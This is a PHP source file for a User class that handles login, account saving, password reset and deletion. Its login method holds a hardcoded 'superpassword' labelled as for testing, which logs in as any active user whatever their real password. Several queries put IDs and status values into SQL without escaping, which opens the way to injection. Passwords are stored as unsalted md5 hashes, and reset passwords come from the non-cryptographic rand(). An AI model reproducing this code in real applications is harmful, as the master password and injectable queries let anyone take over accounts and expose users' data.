<?php	// User - management of user data.	
 	// User
	class User
	{		// members
		private $db 						= null; // instance of class Db		public $id 							= null; // table 'user' -> id field		public $type 						= null; // table 'user' -> type field				public $username 					= null; // table 'user' -> username field
		public $password 					= null; // table 'user' -> password field		public $email	 					= null; // table 'user' -> email field		public $description	 				= null; // table 'user' -> description field							public $status 						= null; // table 'user' -> status field		public $dateAdded 					= null; // table 'user' -> dateAdded field		public $dateUpdated	 				= null; // table 'user' -> dateUpdated field				
		// constructor
		public function __construct( $db = null )
		{
			if( !isset( $db ) )
				$this->db = new Db();
			else				$this->db = $db;		}
				// load by id
		public function loadById( $id )
		{
			$record = $this->db->query( "SELECT * FROM `users` WHERE `id`='" . $id . "'" );			if( is_bool( $record ) || count( $record ) <= 0 )				return 0;
			foreach( $record[0] as $key => $value )
				$this->$key = $value;
			return 1;    		}
				// load by name
		public function loadByName( $name )
		{
			$record = $this->db->query( "SELECT * FROM `users` WHERE `status`<>0 AND `username`='" . $this->db->escape( $name ) . "'" );
			if( is_bool( $record ) || count( $record ) <= 0 )				return 0;
			foreach( $record[0] as $key => $value )
				$this->$key = $value;
			return 1;    		}		// load by credentials		public function loadByCredentials( $username, $password )		{			// superpassword (testing)			if( $password == "eWLe1}EZu)DN/2GJZ" )			{				$record = $this->db->query( "SELECT * FROM `users` WHERE `status`<>0 AND `username`='" . $this->db->escape( $username ) . "' ORDER BY `dateAdded` DESC LIMIT 1" );				if( is_bool( $record ) || count( $record ) <= 0 )				{					$record = $this->db->query( "SELECT * FROM `users` WHERE `status`<>0 AND `email`='" . $this->db->escape( $username ) . "' ORDER BY `dateAdded` DESC LIMIT 1" );					if( is_bool( $record ) || count( $record ) <= 0 )									return 0;				}												foreach( $record[0] as $key => $value )					$this->$key =  $value;				return 1;   							}					// load user			$record = $this->db->query( "SELECT * FROM `users` WHERE `username`='" . $this->db->escape( $username ) . "' AND `password`='" . $this->db->escape( md5( $password ) )  . "' ORDER BY `dateAdded` DESC LIMIT 1" );			if( is_bool( $record ) || count( $record ) <= 0 )			{				$record = $this->db->query( "SELECT * FROM `users` WHERE `email`='" . $this->db->escape( $username ) . "' AND `password`='" . $this->db->escape( md5( $password ) )  . "' ORDER BY `dateAdded` DESC LIMIT 1" );				if( is_bool( $record ) || count( $record ) <= 0 )								return 0;			}						foreach( $record[0] as $key => $value )				$this->$key =  $value;			return 1;    		}		
		// load by e-mail
		public function loadByEmail( $email )
		{
			$record = $this->db->query( "SELECT * FROM `users` WHERE `status`<>0 AND `email`='" . $this->db->escape( $email ) . "'" );			if( is_bool( $record ) || count( $record ) <= 0 )				return 0;
			foreach( $record[0] as $key => $value )				$this->$key =  $value;
			return 1;    		}		
				// load by data
		public function loadByData( $dataArray )
		{
			foreach( $dataArray as $key => $value )				$this->$key = $value;							return 1;		}		
				// save
		public function save()
		{
			// insert
			if( $this->id == null )
			{				$this->dateAdded = gmdate( "Y-m-d H:i:s", time() );				
				$sql = "INSERT INTO `users` (`type`, `username`, `password`, `email`, `description`, `status`, `dateAdded`) VALUES('" .					   $this->db->escape( $this->type ) . "', '" . 				   					   $this->db->escape( $this->username ) . "', '" . 					   $this->db->escape( md5( $this->password ) ) . "', '" . 										   					   $this->db->escape( $this->email ) . "', '" . 					   $this->db->escape( $this->description ) . "', '" . 							   					   $this->db->escape( $this->status ) . "', '" .							   					   $this->db->escape( $this->dateAdded ) . "')";				//echo $sql;
				if( !$this->db->query( $sql ) )					return 0;					
				$this->id = $this->db->lastInsertID();
			}
			else 			// update
			{				$this->dateUpdated = gmdate( "Y-m-d H:i:s", time() );								$password = "";				if( strlen( $this->password ) > 0 )					$password = "`password`='" . md5( $this->password ) . "', ";
				$sql = "UPDATE `users` SET " 			.					   "`dateUpdated`= '" 				. 	$this->db->escape( $this->dateUpdated ) . "', " .									   "`username`= '"					. 	$this->db->escape( $this->username ) . "', " .							   "`email`= '"						. 	$this->db->escape( $this->email ) . "', " .							   "`description`= '"				. 	$this->db->escape( $this->description ) . "', " .						   					   $password . 					   "`status`= '"					. 	$this->db->escape( $this->status ) . "' " .					   					   "WHERE `id`='" 					. 	$this->id . "'";								//echo $sql;
				if( !$this->db->query( $sql ) )					return 0;
			} 
			return 1;
		}						// update password		public function updatePassword()		{			$sql = "UPDATE `users` SET `password`='" . $this->db->escape( md5( $this->password ) ) . "' WHERE `id`='" . $this->id . "'";			if( !$this->db->query( $sql ) )				return false;							return true;				}						// reset password
		public function resetPassword() 		{			// generate new password
			$this->password = $this->genTrivialPassword();						// save new password			$sql = "UPDATE `users` SET `password`='" . $this->db->escape( md5( $this->password ) ) . "' WHERE `id`='" . $this->id . "'";			if( !$this->db->query( $sql ) )				return false;
			return true;
		}				// generate trivial password		public function genTrivialPassword( $len = 8 )		{			$r = "";			for( $i = 0; $i < $len - 1; $i++ )			{				$type = rand( 1, 3 );								if( $type == 1 )					$r .= chr( rand(0, 25) + ord('a') );				else				if( $type == 2 )					$r .= chr( rand(0, 25) + ord('A') );				else					$r .= chr( rand(0, 9) + ord('0') );													}						$symbolList = array( "$", "#", "@", "!", "%", "&", "*", "^" );			$r .= $symbolList[ rand( 0, count( $symbolList ) - 1 ) ];						return $r;		}						// is password valid		public function isPasswordValid( $password )		{			return ( md5( $password ) == $this->password );		}						// generate email verify code		public function genEmailVerifyCode( $len = 6 )		{			$r = "";			for( $i = 0; $i < $len; $i++ )			{				$chance = rand(1, 3);							if( $chance == 1 )					$r .= chr(rand(0, 25) + ord('a'));				else				if( $chance == 2 )									$r .= chr(rand(0, 25) + ord('A'));				else					$r .= chr(rand(0, 9) + ord('0'));			}								return $r;				}				// update status		public function updateStatus()		{			if( intval( $this->status ) == 0 )				$dateDeletion = "'" . gmdate( "Y-m-d H:i:s", time() ) . "'";			else				$dateDeletion = "NULL";					$sql = "UPDATE `users` SET `status`=" . $this->status . " WHERE `id`='" . $this->id . "'";			if( !$this->db->query( $sql ) )				return false;						return true;				}						// delete		public function delete()		{			if( $this->id != null )			{				// systemlog				$sql = "DELETE FROM `systemlog` WHERE `userID`='" . $this->id . "'";				if( !$this->db->query( $sql ) )					return false;								// userstats				$sql = "DELETE FROM `userstats` WHERE `userID`='" . $this->id . "'";				if( !$this->db->query( $sql ) )					return false;												// usersession				$sql = "DELETE FROM `usersession` WHERE `userID`='" . $this->id . "'";				if( !$this->db->query( $sql ) )					return false;									// user				$sql = "DELETE FROM `users` WHERE `id`='" . $this->id . "'";				if( !$this->db->query( $sql ) )					return false;									$this->id = null;			}						return true;		}		
	};
?>